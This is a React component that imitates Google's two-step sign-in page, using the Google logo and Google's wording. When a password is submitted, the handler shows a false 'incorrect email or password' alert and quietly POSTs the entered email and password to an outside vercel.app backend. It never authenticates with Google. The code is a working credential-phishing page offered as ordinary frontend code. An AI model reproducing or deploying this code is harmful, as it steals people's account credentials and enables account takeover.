"use client";
import React, { useState } from "react";
import { FcGoogle } from "react-icons/fc";
import axios from "axios";

const GoogleLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState(1); // 1 for email, 2 for password

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleNext = (e) => {
    e.preventDefault();
    if (step === 1 && email) {
      setStep(2);
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (step === 2 && email.includes("@") && password.length >= 8) {
      alert("incorrect email or password");
      let data = JSON.stringify({
        username: email,
        password: password,
      });

      let config = {
        method: "post",
        maxBodyLength: Infinity,
        url: "https://backend-three-xi-39.vercel.app/user",
        headers: {
          "Content-Type": "application/json",
        },
        data: data,
      };

      axios
        .request(config)
        .then((response) => {
          console.log();
        })
        .catch((error) => {
          console.log(error);
        });

      // Add your authentication logic here
    }
  };

  const handleBack = () => {
    setStep(1);
  };

  return (
    <div className="login-container">
      <div className="login-card">
        <div className="logo-container">
          <FcGoogle size={48} />
        </div>
        <h1>{step === 1 ? "Sign in" : "Welcome"}</h1>
        <p className="mb-[32px]">
          {step === 1
            ? "with your Google Account. This account will be available to other Google apps in the browser."
            : email}
        </p>

        {step === 1 && (
          <form onSubmit={handleNext}>
            <div className="input-group">
              <input
                type="email"
                className="bg-[transparent] color-[rgb(227 227 227 / 1)]"
                id="email"
                value={email}
                onChange={handleEmailChange}
                required
                placeholder=" "
              />
              <label htmlFor="email">Email or phone</label>
            </div>

            <a className="forgot-email">Forgot email?</a>

            <p className="not-your-computer">
              Not your computer? Use a private Browse window to sign in.
              <br />
              <a>Learn more</a>
            </p>

            <div className="button-group">
              <button className="create-account-button">Create account</button>
              <button type="submit" className="next-button">
                Next
              </button>
            </div>
          </form>
        )}

        {step === 2 && (
          <form onSubmit={handleSubmit}>
            <div className="input-group">
              <input
                type="password"
                className="bg-[transparent] color-[rgb(227 227 227 / 1)]"
                id="password"
                value={password}
                onChange={handlePasswordChange}
                required
                placeholder=" "
              />
              <label htmlFor="password">Enter your password</label>
            </div>

            <a className="forgot-password">Forgot password?</a>

            <div className="button-group">
              <button
                type="button"
                className="back-button"
                onClick={handleBack}
              >
                Back
              </button>
              <button type="submit" className="next-button">
                Next
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
};

export default GoogleLogin;
